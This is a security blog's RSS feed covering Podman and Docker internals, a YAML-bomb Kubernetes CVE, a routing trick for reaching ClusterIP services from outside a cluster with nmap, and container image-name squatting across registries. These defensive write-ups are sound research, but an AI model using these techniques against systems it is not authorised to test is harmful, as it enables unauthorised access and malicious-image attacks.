<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title></title>
		<description>Things that occur to me</description>
		<link>/</link>
		<atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
		
			<item>
				<title>More Podman - Rootfull containers, Networking and processes</title>
				<description>&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;

&lt;p&gt;This is a follow on from my &lt;a href=&quot;https://raesene.github.io/blog/2020/02/01/Comparing-Docker-And-Podman/&quot;&gt;previous post&lt;/a&gt; which started looking at how podman varies from running local containers with Docker.&lt;/p&gt;

&lt;p&gt;One point that was raised after that post, was that podman can run containers as root as well, and that’s an interesting area to explore.&lt;/p&gt;

&lt;h2 id=&quot;running-podman-as-root&quot;&gt;Running podman as root&lt;/h2&gt;

&lt;p&gt;So we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt; on an ubuntu host to run podman containers as the root user. There’s a couple of reasons you might want to do this.  First up would be that you need access to functions that are not available to your standard user (for example binding ports &amp;lt; 1024), another could be down to the differences in network behaviour between rootless and rootfull containers.&lt;/p&gt;

&lt;p&gt;One thing you’ll notice immediately when using sudo to run podman containers is that, you’re not sharing any container images with your ordinary user, so it’ll pull down images that aren’t present for the root user.&lt;/p&gt;

&lt;p&gt;Unlike Docker there’s no shared system level image repository, by default, so it will go and retrieve images where needed.&lt;/p&gt;

&lt;h2 id=&quot;difference-in-networking---rootless-vs-rootfull&quot;&gt;Difference in networking - rootless v.s. rootfull&lt;/h2&gt;

&lt;p&gt;Another area where there are some notable differences between rootless and rootfull containers under podman is in networking.  As mentioned last time rootless containers use &lt;code class=&quot;highlighter-rouge&quot;&gt;slirp4netns&lt;/code&gt; to provide containers an IP address.  This is quite a different model to the Docker bridge, with a couple of practical effects.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;There’s no shared network for rootless containers.  Each one is plumbed into a &lt;code class=&quot;highlighter-rouge&quot;&gt;tap&lt;/code&gt; interface which is then networked out to the host by slirp4netns.  So if you start two containers in rootless mode, by default, they can’t talk directly to each other without exposing ports on the host.&lt;/li&gt;
  &lt;li&gt;All your containers get the same IP address.  On the installation I’m using they all get &lt;code class=&quot;highlighter-rouge&quot;&gt;10.0.2.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;By comparison, if you run containers rootfully, the networking looks much more similar to the default Docker configuration. Containers will get an individual IP address, and will be able to communicate with other containers on the bridge network that they’ve been connected to.&lt;/p&gt;

&lt;h2 id=&quot;podman-networking---usable-macvlan&quot;&gt;Podman Networking - Usable MacVLAN&lt;/h2&gt;

&lt;p&gt;Anyone who’s dug around in Docker networking for a while, will likely have come across the MacVLAN network type.  This is kind of like a VMWare Workstation/Fusion bridge network, where the container gets placed on the the same network as the host, getting rid of the need for explicit port forwarding.&lt;/p&gt;

&lt;p&gt;The downside to Docker’s implementation has always been that there’s no support for DHCP with MacVLAN, so you need to have a range of IP addresses to assign to the container that aren’t going to be used elsewhere.&lt;/p&gt;

&lt;p&gt;When I was looking round Podman’s networking options, I noticed that there’s a plug-in that can allow Rootfull podman containers to do something similar, but with DHCP support.  This basically follows &lt;a href=&quot;https://www.redhat.com/sysadmin/leasing-ips-podman&quot;&gt;this post&lt;/a&gt; on the Redhat blog, but there’s a couple of details that worked differently on the system I was running on.&lt;/p&gt;

&lt;p&gt;After creating a network config, as mentioned in the post you start the DHCP plug-in.  On ubuntu this is in &lt;code class=&quot;highlighter-rouge&quot;&gt;/opt/cni/bin&lt;/code&gt; instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/libexec/cni&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;You can then run a container attached to that network and it’ll get an IP address on the same LAN as your host.  In my set-up this took a couple of seconds to do and you get some “network is down” messages as it’s starting, which can be a bit disconcerting, but it does work!&lt;/p&gt;

&lt;h2 id=&quot;rootless-containers---and-user-sessions&quot;&gt;Rootless containers - and user sessions&lt;/h2&gt;

&lt;p&gt;One thing I noted whilst using Podman this week, which was a surprise to me was that containers launched by a user survive that user logging out and back in again. I had assumed that the container would come under the user session that launched them, and so would be terminated when the user logged out, however that’s not what happens, the container will keep running and be available when you log back in, which is handy.&lt;/p&gt;

</description>
				<pubDate>Sun, 23 Feb 2020 11:10:39 +0000</pubDate>
				<link>/blog/2020/02/23/More-Podman/</link>
				<guid isPermaLink="true">/blog/2020/02/23/More-Podman/</guid>
			</item>
		
			<item>
				<title>Comparing Docker and Podman - Basic Operations</title>
				<description>&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;

&lt;p&gt;I’ve been meaning to take more of a look at &lt;a href=&quot;https://podman.io/&quot;&gt;podman&lt;/a&gt; for a while. This is a Redhat backed project which provides an alternative to Docker for local operation of containers.  One of it’s big selling points over the current versions of Docker is the ability to run containers as an ordinary user, without needing access to a daemon process running as root (it’s worth noting that Docker are &lt;a href=&quot;https://docs.docker.com/engine/security/rootless/&quot;&gt;working on&lt;/a&gt; ‘rootless’ mode too)&lt;/p&gt;

&lt;p&gt;What I thought would be useful would be to compare the two with common use-cases and see some of what’s going on under the hood.  Both projects use &lt;a href=&quot;https://github.com/opencontainers/runc&quot;&gt;runc&lt;/a&gt; as the underlying tool for launching containers, but the higher level components are quite different.&lt;/p&gt;

&lt;h2 id=&quot;installation&quot;&gt;Installation&lt;/h2&gt;

&lt;p&gt;For these tests I installed Docker-CE on Ubuntu 18.04.3, following the Docker install process &lt;a href=&quot;https://docs.docker.com/install/linux/docker-ce/ubuntu/&quot;&gt;here&lt;/a&gt; and installed Docker 19.03.5. For podman I made use of the Ubuntu installation instructions &lt;a href=&quot;https://podman.io/getting-started/installation&quot;&gt;here&lt;/a&gt; using the packages provided by the &lt;a href=&quot;https://kubic.opensuse.org/&quot;&gt;kubic project&lt;/a&gt; I installed Podman version 1.7.0.&lt;/p&gt;

&lt;p&gt;I was pleasantly surprised to find that it’s possible to have both podman and Docker installed on the same host using this method, the deb’s provided didn’t clash at all with regards to dependencies.&lt;/p&gt;

&lt;h2 id=&quot;initial-post-installation&quot;&gt;Initial Post Installation&lt;/h2&gt;

&lt;p&gt;After installation, with Docker there are two daemon processes running, containerd and dockerd.  With podman, as expected, there are no long running processes initially.  One thing I did notice, which was unexpected was that after running the &lt;code class=&quot;highlighter-rouge&quot;&gt;podman info&lt;/code&gt; command, a podman process was left running on the host.&lt;/p&gt;

&lt;h2 id=&quot;image-storage&quot;&gt;Image storage&lt;/h2&gt;

&lt;p&gt;The Docker daemon stores all the files related to it in &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/lib/docker&lt;/code&gt; which obviously won’t make sense for a container tool that’s running for the individual user.  Podman stores its files at &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/$USER/.local/share/containers/storage&lt;/code&gt; .  One point that could be relevant here for some use cases is that this will mean that if you have multiple users on a host running containers, each user will pull and store their own copy of all images, which would take some additional storage&lt;/p&gt;

&lt;h2 id=&quot;basic-commands&quot;&gt;Basic commands&lt;/h2&gt;

&lt;p&gt;Running a basic interactive container with &lt;code class=&quot;highlighter-rouge&quot;&gt;podman run -it ubuntu:18.04 /bin/bash&lt;/code&gt; works as expected and lands you in a “root” shell inside the container.  One interesting point is that, on Ubuntu, podman defaults to requesting images from Docker Hub first, although it does support a registry search order.  This is an important point for security as having a different search order for container images could result in unexpected behaviour (more details on this &lt;a href=&quot;https://raesene.github.io/blog/2019/09/25/typosquatting-in-a-multi-registry-world/&quot;&gt;here&lt;/a&gt; and &lt;a href=&quot;https://github.com/containers/libpod/issues/4549&quot;&gt;here&lt;/a&gt;)&lt;/p&gt;

&lt;h2 id=&quot;processes-behind-the-scenes&quot;&gt;Processes behind the scenes&lt;/h2&gt;

&lt;p&gt;What’s happening behind the scenes for this command is quite interesting.  There’s a couple of processes being used to manage our ubuntu container.  A &lt;a href=&quot;https://github.com/rootless-containers/slirp4netns&quot;&gt;slirp4netns&lt;/a&gt; process is running.  This is a tool which helps networking work in unprivileged containers.&lt;/p&gt;

&lt;p&gt;There’s also a &lt;a href=&quot;https://github.com/containers/conmon&quot;&gt;conmon&lt;/a&gt; process running, which is another helper process.&lt;/p&gt;

&lt;p&gt;These two processes are used for every container, so if you run 10 containers, you’ll get 20 supporting processes.&lt;/p&gt;

&lt;p&gt;Comparing this to Docker, conmon seems to be the equivalent of the &lt;code class=&quot;highlighter-rouge&quot;&gt;containerd-shim&lt;/code&gt; process that runs with every container and there’s no &lt;code class=&quot;highlighter-rouge&quot;&gt;slirp4netns&lt;/code&gt; equivalent needed as Docker is running with &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; privileges.&lt;/p&gt;

&lt;h2 id=&quot;namespaces&quot;&gt;Namespaces&lt;/h2&gt;

&lt;p&gt;Docker uses Linux namespaces to provide an isolated environment for contained processes, and as they both use &lt;code class=&quot;highlighter-rouge&quot;&gt;runc&lt;/code&gt; under the covers, it’s not too surprising to see that &lt;code class=&quot;highlighter-rouge&quot;&gt;podman&lt;/code&gt; is similar. There are some differences though that are worth noting.  Running &lt;code class=&quot;highlighter-rouge&quot;&gt;lsns&lt;/code&gt; on a host running an ubuntu container via podman we can see the following&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;4026532621 user        4  1352 rorym            podman
4026532622 mnt         2  1352 rorym            podman
4026532624 net         1  1479 rorym            /bin/bash
4026532679 mnt         1  1479 rorym            /bin/bash
4026532680 mnt         1  1465 rorym            /usr/bin/slirp4netns --disable-host-loopback --mtu 65520 --e
4026532681 uts         1  1479 rorym            /bin/bash
4026532682 ipc         1  1479 rorym            /bin/bash
4026532683 pid         1  1479 rorym            /bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Running &lt;code class=&quot;highlighter-rouge&quot;&gt;lsns&lt;/code&gt; on a Docker container doing using the same image and command we get&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;4026532626 mnt         1  1932 root             /bin/bash
4026532627 uts         1  1932 root             /bin/bash
4026532628 ipc         1  1932 root             /bin/bash
4026532629 pid         1  1932 root             /bin/bash
4026532631 net         1  1932 root             /bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The podman list includes a user namespace which isn’t too surprising as we’re running as an ordinary user, but appear to be the &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; user inside the container.  What is interesting is that there’s a single user namespace which is attached to the podman process, rather than it being directly attached to the container.  Also we can see that there’s a mnt namespace for slirp4netns.&lt;/p&gt;

&lt;h2 id=&quot;capabilities&quot;&gt;Capabilities&lt;/h2&gt;

&lt;p&gt;By default, Docker containers get a set of capabilities, which can allow them to execute operations which require root privileges.  While podman is running as an ordinary user and making use of user namespaces, it does still use capabilities, but unlike Docker they only allow privileges within the user namespace and not over the entire host.&lt;/p&gt;

&lt;p&gt;Running &lt;code class=&quot;highlighter-rouge&quot;&gt;pscap&lt;/code&gt; under podman shows the following lines relevant to podman&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1     1352  rorym       podman pause      full
1     1465  rorym       slirp4netns       net_bind_service
1     1468  rorym       conmon            full
1468  1479  rorym       bash              chown, dac_override, fowner, fsetid, kill, setgid, setuid, setpcap, net_bind_service, net_raw, sys_chroot, mknod, audit_write, setfcap
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For Docker we get :-&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;978   1913  root        containerd-shim   full
1913  1932  root        bash              chown, dac_override, fowner, fsetid, kill, setgid, setuid, setpcap, net_bind_service, net_raw, sys_chroot, mknod, audit_write, setfcap
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The key difference being the 4 processes running for podman are all in a user namespace.&lt;/p&gt;

&lt;h2 id=&quot;apparmor&quot;&gt;AppArmor&lt;/h2&gt;

&lt;p&gt;Docker provides a default AppArmor policy which restricts the contained process.  Looking at the podman setup, there doesn’t appear to be an apparmor policy getting enabled by default.  Running &lt;code class=&quot;highlighter-rouge&quot;&gt;aa-status&lt;/code&gt; shows 0 processes in enforce mode.&lt;/p&gt;

&lt;h2 id=&quot;seccomp&quot;&gt;Seccomp&lt;/h2&gt;

&lt;p&gt;Docker also uses a &lt;a href=&quot;https://www.kernel.org/doc/html/v4.16/userspace-api/seccomp_filter.html&quot;&gt;seccomp-bpf&lt;/a&gt; filter to restrict calls to specific syscalls.  Looking at the &lt;code class=&quot;highlighter-rouge&quot;&gt;bash&lt;/code&gt; process running under Podman, we can see that there is also a Seccomp profile attached there&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat /proc/1479/status | grep Seccomp
Seccomp:	2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;limitations-of-rootless-containers&quot;&gt;Limitations of rootless containers&lt;/h2&gt;

&lt;p&gt;With the use of rootless containers, there does come some limitations/complications.  There are some things that won’t work in rootless mode.  Things like not being able to bind ports &amp;lt; 1024 make sense as this is a feature generally restricted for the root user.  However, some of the other items that are root only might be a surprise like network management.&lt;/p&gt;

&lt;p&gt;As Dan Walsh &lt;a href=&quot;https://twitter.com/rhatdan/status/1225797102820716544&quot;&gt;points out&lt;/a&gt; podman can also run containers as root, and that’s something I’ll explore more in the &lt;a href=&quot;https://raesene.github.io/blog/2020/02/23/More-Podman/&quot;&gt;next post&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;It’s clear that the podman ecosystem is coming along quite well and that, for a lot of use cases, it could be used by developers on local machines to avoid the overhead and security risk of running a root daemon to allow for container use.  There are some limitations, but those seem to be more about the inherent limits of running as an unprivileged user than anything else.&lt;/p&gt;
</description>
				<pubDate>Sat, 01 Feb 2020 11:10:39 +0000</pubDate>
				<link>/blog/2020/02/01/Comparing-Docker-And-Podman/</link>
				<guid isPermaLink="true">/blog/2020/02/01/Comparing-Docker-And-Podman/</guid>
			</item>
		
			<item>
				<title>From Stackoverflow to CVE, with some laughs along the way</title>
				<description>&lt;h2 id=&quot;discovery&quot;&gt;Discovery&lt;/h2&gt;

&lt;p&gt;A couple of weeks ago I was on Stackoverflow and noticed an &lt;a href=&quot;https://stackoverflow.com/questions/58129150/security-yaml-bomb-user-can-restart-kube-api-by-sending-configmap/58133282#58133282&quot;&gt;interesting post&lt;/a&gt; with one of my watched tags. The post described a problem where the user had submitted a YAML manifest to their Kubernetes server and caused very high CPU/memory usage, indicating that there could be an application Denial of service issue.&lt;/p&gt;

&lt;p&gt;The YAML posted was a lightly modified version of the YAML bomb example on this &lt;a href=&quot;https://en.wikipedia.org/wiki/Billion_laughs_attack&quot;&gt;Wikipedia page&lt;/a&gt; about the “Billion Laughs Attack”.  This is an issue mainly associated with XML parsing where recursive entities can be defined in a document and, when expanding them, the process parsing the document consumes large amounts of CPU and memory.&lt;/p&gt;

&lt;p&gt;A bit of checking seemed to show that this indeed was a valid issue but that the resource utilization was on the client-side in &lt;code class=&quot;highlighter-rouge&quot;&gt;kubectl&lt;/code&gt; and not server-side, so it wouldn’t seem like a major issue.&lt;/p&gt;

&lt;p&gt;That changed after conferring with Brad Geesaman and Jordan Liggitt on the Kubernetes slack as it became obvious that the Denial of Service could occur on either the client or server, depending on how the document was passed to the server. When &lt;code class=&quot;highlighter-rouge&quot;&gt;kubectl&lt;/code&gt; was used the YAML was parsed locally before being passed to the Kubernetes API server, however by using &lt;code class=&quot;highlighter-rouge&quot;&gt;curl&lt;/code&gt; the YAML could be passed directly to the API server causing the YAML to be parsed server-side.&lt;/p&gt;

&lt;p&gt;Doing some initial testing on a local VM it was obvious that the server could be DoS’d with a relatively small number of requests and Brad checked that this could also impact cloud hosted versions. The example given did require the attacker to be able to create &lt;code class=&quot;highlighter-rouge&quot;&gt;configMap&lt;/code&gt; objects on the server, which reduced the number of potential attackers considerably, so this would be an moderately serious issue but not too bad, as it required an authenticated user.&lt;/p&gt;

&lt;p&gt;After that though, some more investigation did show that, under some circumstances, it was possible to pass YAML to the server as an unauthenticated user, which makes the issue more serious, especially if your Kubernetes cluster is exposed to the Internet.  This is a (somewhat surprisingly) common configuration, with over 200,000 Kubernetes servers being internet facing (based on statistics from &lt;a href=&quot;https://www.binaryedge.io/&quot;&gt;Binary Edge&lt;/a&gt;).  It won’t always be the case that older clusters are vulnerable (as it depends on the exact configuration) but it’s more likely.&lt;/p&gt;

&lt;p&gt;After the &lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/83253&quot;&gt;issue&lt;/a&gt; had been reported to the Kubernetes security team they quickly had a CVE assigned and arranged for patch releases to be created which are dropping today, covering versions 1.13 and up.&lt;/p&gt;

&lt;h2 id=&quot;mitigation&quot;&gt;Mitigation&lt;/h2&gt;

&lt;p&gt;There are a couple of mitigations that can be applied to avoid this being an issue for your Kubernetes cluster.  Firstly, ensure that you apply the available patches or, if you are using a managed Kubernetes distribution, ensure that your vendor has patched the issue.&lt;/p&gt;

&lt;p&gt;Secondly, consider whether your Kubernetes server needs to be directly exposed to the Internet, or whether access to it can be restricted using firewalling or placing it behind a bastion host or VPN.&lt;/p&gt;

&lt;p&gt;Another good mitigation is to minimize or remove anonymous access from the Kubernetes API server, although care is needed here as some monitoring tools require unauthenticated access to some endpoints.  Some older versions of Kubernetes allowed quite a few unauthenticated requests, including some which can trigger this issue.  Removing access from the &lt;code class=&quot;highlighter-rouge&quot;&gt;system:unauthenticated&lt;/code&gt; user or setting &lt;code class=&quot;highlighter-rouge&quot;&gt;--anonymous-auth=false&lt;/code&gt; on the API server can reduce the risk of this issue being triggered on a cluster.  Again, if you’re using a managed Kubernetes distribution, you’ll need to speak to your vendor about enabling those flags.&lt;/p&gt;

&lt;h2 id=&quot;underlying-library---a-tale-of-differing-perspectives&quot;&gt;Underlying library - A tale of differing perspectives&lt;/h2&gt;

&lt;p&gt;After looking at the Kubernetes perspective, I thought it would be interesting to dig down to where this issue originated, to see if it may have a wider impact.&lt;/p&gt;

&lt;p&gt;The affected code comes from the &lt;a href=&quot;https://github.com/go-yaml/yaml&quot;&gt;go-yaml&lt;/a&gt; library.  I reported the issue to the Go security team and they got in touch with the library author.  A fix, which already existed in a later version of the library, was quickly put in place for the v2 one (which was used by Kubernetes). However at this point an interesting difference of opinion cropped up.&lt;/p&gt;

&lt;p&gt;I suggested raising a CVE for this issue to help awareness for downstream projects.  The author felt that, as the original code was compliant with the YAML specification, this was unnecessary and the Go security team felt that it wasn’t their role to assign one.&lt;/p&gt;

&lt;p&gt;Both of these positions make sense, when considered from their respective positions. But, this causes quite a serious problem from a security community perspective.&lt;/p&gt;

&lt;p&gt;The problem is that CVEs are used by most software security tools as flags to indicate “this library needs to be upgraded”. Without a CVE it’s very likely that automated software scanning tools (that are used in many enterprises for software vulnerability management) won’t flag this issue, and that unless teams manually review the changelogs of all their dependencies (a large task) they’ll be unaware of the potential risk.&lt;/p&gt;

&lt;p&gt;The library in question is heavily used in the Go community, with around 36000 code references on Github alone, and presumably a lot of use elsewhere as YAML is a common format in the Cloud Native space where Go is often used.&lt;/p&gt;

&lt;p&gt;It also raises the possibility of confusion if the Kubernetes CVE is used as an ersatz stand-in for a library one.  It’s already possible to see other projects which use the library referencing the Kubernetes CVE as a driver for updating their library version, which would seem very odd if you don’t know the back-story.&lt;/p&gt;

&lt;p&gt;This is also an example of a possible expectations gap between different groups.  The enterprise IT/Security communities might be expecting the CVE databases to be the canonical source of vulnerabilities that they can use to prioritise software and library upgrades but if the software development communities don’t see the necessity of always assigning a CVE, that expectation won’t hold…&lt;/p&gt;
</description>
				<pubDate>Tue, 15 Oct 2019 18:10:39 +0100</pubDate>
				<link>/blog/2019/10/15/From-stackoverflow-to-CVE/</link>
				<guid isPermaLink="true">/blog/2019/10/15/From-stackoverflow-to-CVE/</guid>
			</item>
		
			<item>
				<title>Accessing Cluster IPs from the Outside</title>
				<description>&lt;p&gt;This is a neat trick which could be useful when troubleshooting Kubernetes services or testing Kubernetes clusters.  This got used in a &lt;a href=&quot;https://tgik.io&quot;&gt;TGIK&lt;/a&gt; episode a while back and I’ve been meaning to test it and write it up for a while, as I’ve not seen many docs on it.&lt;/p&gt;

&lt;p&gt;When you run Kubernetes services, generally they are of type “ClusterIP” which means they get assigned a fixed IP address inside the cluster, but this IP address isn’t visible externally (it’s not designed for external users to contact the service, that’s what Ingress resources or NodePort services are for).&lt;/p&gt;

&lt;p&gt;However, given the way Kubernetes works, it’s possible to access these service IP addresses by the simple expedient of …. Adding a route to them :)  Essentially Kubernetes nodes are Linux routers and kube-proxy will direct traffic for us and doesn’t generally care what generated that traffic.&lt;/p&gt;

&lt;p&gt;Let’s provide a concrete example.  I’ve got a single node Kubeadm cluster with a single Ethernet interface &lt;code class=&quot;highlighter-rouge&quot;&gt;ens33&lt;/code&gt; with an IP address of &lt;code class=&quot;highlighter-rouge&quot;&gt;172.16.198.131&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The servce IP address range defined on the cluster is the standard &lt;code class=&quot;highlighter-rouge&quot;&gt;10.96.0.0/12&lt;/code&gt; . If I try to scan a service listening in that range on &lt;code class=&quot;highlighter-rouge&quot;&gt;10.105.140.70:3000&lt;/code&gt; for example from a host outside the cluster, I’ll get told that port is filtered. One point to note here (as suggested by &lt;a href=&quot;https://twitter.com/TinkerFairy_Net&quot;&gt;@TinkerFairy_Net&lt;/a&gt;) is that filtered from an nmap TCP scan means it didn’t receive any response to the request, not that there’s some security measure preventing access.&lt;/p&gt;

&lt;p&gt;One other point about the command below is that you need the &lt;code class=&quot;highlighter-rouge&quot;&gt;-Pn&lt;/code&gt; switch to disable nmap’s Ping scanning which it usually does to determine if a host is live.  Service IPs aren’t real machines, so they won’t respond on any port other than the service one.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nmap -Pn -sT -n -p3000 10.105.140.70

Starting Nmap 7.60 ( https://nmap.org ) at 2019-10-03 19:51 BST
Nmap scan report for 10.105.140.70
Host is up.

PORT     STATE    SERVICE
3000/tcp filtered ppp

Nmap done: 1 IP address (1 host up) scanned in 2.04 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So we can’t get to that port on that IP address. Now lets try adding a route to the service IP address network via the cluster node’s main IP address.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo ip route add 10.96.0.0/12 via 172.16.198.131
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This change essentially tells our client machine that there’s another router on the network and that for traffic in the range &lt;code class=&quot;highlighter-rouge&quot;&gt;10.96.0.0/12&lt;/code&gt; it should send the packets to our Kubernetes cluster node for onwards transmission.&lt;/p&gt;

&lt;p&gt;Now if we retry the same command&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nmap -Pn -sT -n -p3000 10.105.140.70

Starting Nmap 7.60 ( https://nmap.org ) at 2019-10-03 19:53 BST
Nmap scan report for 10.105.140.70
Host is up (0.00074s latency).

PORT     STATE SERVICE
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 0.03 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Our port is open :)&lt;/p&gt;

&lt;p&gt;So we can interrogate any service in that network from outside the cluster (and without any rights to the cluster!) without restriction.&lt;/p&gt;

&lt;p&gt;From a security point, the important thing to take away here is, don’t assume that services are protected because they’re not hooked into an ingress, if an attacker can route traffic to the cluster, they can just do this to see those IP addresses.&lt;/p&gt;
</description>
				<pubDate>Thu, 03 Oct 2019 18:10:39 +0100</pubDate>
				<link>/blog/2019/10/03/accessing-cluster-ips-from-the-outside/</link>
				<guid isPermaLink="true">/blog/2019/10/03/accessing-cluster-ips-from-the-outside/</guid>
			</item>
		
			<item>
				<title>Container Image Squatting in a Multi-Registry World</title>
				<description>&lt;p&gt;I’ve been starting to have a look at &lt;a href=&quot;https://podman.io/&quot;&gt;podman&lt;/a&gt; recently and in doing so, I noticed something potentially interesting from a security perspective, which is how podman handles the pulling of new container images.  As podman is billed as a “drop-in” replacement for Docker (and indeed provides a package to alias docker commands to their podman equivalents), it’s interesting to note how default settings might differ, as these differences could trip up unsuspecting users moving from Docker to podman.&lt;/p&gt;

&lt;p&gt;One of the more fixed things in the Docker landscape is how it address container image registries. Docker hub is hard coded in the source code of Docker as the default registry, so that if you do something like &lt;code class=&quot;highlighter-rouge&quot;&gt;docker pull nginx&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;docker pull raesene/alpine-containertools&lt;/code&gt; it will assume that you’re looking for these images on Docker Hub.  If you want to pull from an alternate registry, you need to provide the hostname and port of that registry server.&lt;/p&gt;

&lt;p&gt;This behaviour appears to have been a source of frustration for other organizations in the container ecosystem, so it’s not really a surprise to find that it works differently when you use other tools, like podman.&lt;/p&gt;

&lt;p&gt;What podman does is allow users to specify their registry search order via a configuration file stored at &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/containers/registries.conf&lt;/code&gt;. On a CentOS8 install the default registry search order is this&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[registries.search]
registries = ['registry.redhat.io', 'quay.io', 'docker.io']
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From that, we can see that both Redhat’s registry and Quay come in before Docker.&lt;/p&gt;

&lt;p&gt;This has a potentially interesting side effect from a security perspective, which is, if a user requests an image without specifying the host name and port of the registry, they could get the wrong image.&lt;/p&gt;

&lt;p&gt;To give an example. On Docker hub there’s an image I have with some container tooling called &lt;a href=&quot;https://hub.docker.com/r/raesene/alpine-containertools&quot;&gt;alpine-containertools&lt;/a&gt;.  As an experiment I tried creating the same image name with totally different content on Quay.io which is &lt;a href=&quot;https://quay.io/repository/raesene/alpine-containertools&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;So if you use podman and run &lt;code class=&quot;highlighter-rouge&quot;&gt;docker pull raesene/alpine-containertools&lt;/code&gt; you’re going to get the wrong image.&lt;/p&gt;

&lt;p&gt;This could lead to attackers essentially squatting on common Docker Hub accounts to try and trick users into pulling malicious images.  A process made somewhat easier by the fact that you can register organization names on Quay.io (for example, I registered &lt;a href=&quot;https://quay.io/organization/nccgroup&quot;&gt;nccgroup&lt;/a&gt;).&lt;/p&gt;

&lt;h2 id=&quot;what-can-you-do-about-this&quot;&gt;What can you do about this?&lt;/h2&gt;

&lt;p&gt;Well if you’re planning to adopt podman there’s a couple of things you could do to mitigate this risk&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Change the search order in registries.conf to have &lt;code class=&quot;highlighter-rouge&quot;&gt;docker.io&lt;/code&gt; first, which essentially restores the default behaviour (although it could still produce unexpected results if you misspell your pull request)&lt;/li&gt;
  &lt;li&gt;Remove the other registries from the file altogether (which essentially makes the behaviour the same as Docker)&lt;/li&gt;
  &lt;li&gt;Ensure that you’ve registered any names you use on Docker Hub on Quay.io (this only works where you’re pulling Docker Hub images from accounts you control, but of course who pulls Docker Hub images from accounts they don’t control!)&lt;/li&gt;
  &lt;li&gt;Use FQDNs for all your &lt;code class=&quot;highlighter-rouge&quot;&gt;pull&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;run&lt;/code&gt; statements, essentially bypassing the search order.&lt;/li&gt;
  &lt;li&gt;Make use of image signing to check that the image pulled is the same as that which was expected.&lt;/li&gt;
&lt;/ul&gt;
</description>
				<pubDate>Wed, 25 Sep 2019 18:10:39 +0100</pubDate>
				<link>/blog/2019/09/25/typosquatting-in-a-multi-registry-world/</link>
				<guid isPermaLink="true">/blog/2019/09/25/typosquatting-in-a-multi-registry-world/</guid>
			</item>
		
			<item>
				<title>Kubernetes Security Lab with Kind and Ansible</title>
				<description>&lt;p&gt;Being able to practice exploits and attacks is always useful for security testers, whether it’s working out whether a tool is working properly, or fine-tuning the syntax for a command in a predictable environment, it’s a very handy technique.  One factor that can slow this down is having to rely on external resources, like Virtual Machines or cloud based resources, for running our tests.  Ideally we should be able to run everything locally on a single machine.&lt;/p&gt;

